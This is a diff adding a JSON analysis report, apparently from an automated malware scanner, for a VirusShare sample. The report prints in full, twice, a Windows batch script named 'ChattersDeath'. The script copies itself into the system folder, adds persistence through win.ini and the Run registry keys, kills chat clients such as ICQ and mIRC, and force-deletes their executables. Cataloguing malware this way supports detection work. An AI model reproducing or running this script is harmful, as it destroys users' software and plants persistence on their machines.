@@ -1,0 +1,59 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\n:: ChattersDeath\n:: by Razorblade \n:: m\ufffd!@ h!, m\ufffd!@ hu, m\ufffd!@ h@, m\ufffd!@ h@h@ \n\ncopy %0 \"%systemroot%\\system32\\cht32.bat\" > nul\ncopy %0 \"%systemroot%\\winchat32.bat\" > nul\n\necho [windows] >> \"%systemroot%\\win.ini\"\necho load=%systemroot%\\system32\\cht32.bat >> \"%systemroot%\\win.ini\"\necho run=%systemroot%\\system32\\cht32.bat >> \"%systemroot%\\win.ini\"\n\nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WinMsgChat /t REG_SZ /d \"%systemroot%\\system32\\cht32.bat\" /f > nul\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WinMsgChat /t REG_SZ /d \"%systemroot%\\winchat32.bat\" /f > nul\n\ncls\n\ntskill ICQ* > nul\ntskill mir* > nul\ntskill dir* > nul\ntskill trill* > nul\ntskill scri* > nul\n\ncls\n\nif exist \"%programfiles%\\ICQLite\" (\n\tdel /f \"%programfiles%\\ICQLite\\ICQ*.exe\"\n)\nif exist \"%programfiles%\\ICQ*\" (\n\tdel /f \"%programfiles%\\ICQ*\\ICQ*.exe\"\n)\nif exist \"%programfiles%\\mIRC*\" (\n\tdel /f \"%programfiles%\\mIRC*\\mi*.exe\"\n)\nif exist \"%programfiles%\\Miran*\" (\n\tdel /f \"%programfiles%\\Mirand*\\mir*.exe\"\n)\n\ncls\nexit"
+    },
+    "filename": "VirusShare_1b05e5dd8e703c599f74f04f2dd49faa",
+    "filesize": 1074,
+    "filetype": "DOS batch file, Non-ISO extended-ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1b05e5dd8e703c599f74f04f2dd49faa",
+        "sha1": "296fd0e2bb34f2039a667b513c384a9e7e48e5d5",
+        "sha256": "7996e960bb26c29e96acf3f588467f98e68965a13fac53550a6441f23fd8228d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            ":: ChattersDeath",
+            ":: by Razorblade ",
+            ":: m!@ h!, m!@ hu, m!@ h@, m!@ h@h@ ",
+            "copy %0 \"%systemroot%\\system32\\cht32.bat\" > nul",
+            "copy %0 \"%systemroot%\\winchat32.bat\" > nul",
+            "echo [windows] >> \"%systemroot%\\win.ini\"",
+            "echo load=%systemroot%\\system32\\cht32.bat >> \"%systemroot%\\win.ini\"",
+            "echo run=%systemroot%\\system32\\cht32.bat >> \"%systemroot%\\win.ini\"",
+            "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WinMsgChat /t REG_SZ /d \"%systemroot%\\system32\\cht32.bat\" /f > nul",
+            "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v WinMsgChat /t REG_SZ /d \"%systemroot%\\winchat32.bat\" /f > nul",
+            "tskill ICQ* > nul",
+            "tskill mir* > nul",
+            "tskill dir* > nul",
+            "tskill trill* > nul",
+            "tskill scri* > nul",
+            "if exist \"%programfiles%\\ICQLite\" (",
+            "\tdel /f \"%programfiles%\\ICQLite\\ICQ*.exe\"",
+            "if exist \"%programfiles%\\ICQ*\" (",
+            "\tdel /f \"%programfiles%\\ICQ*\\ICQ*.exe\"",
+            "if exist \"%programfiles%\\mIRC*\" (",
+            "\tdel /f \"%programfiles%\\mIRC*\\mi*.exe\"",
+            "if exist \"%programfiles%\\Miran*\" (",
+            "\tdel /f \"%programfiles%\\Mirand*\\mir*.exe\"",
+            "exit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.298647",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
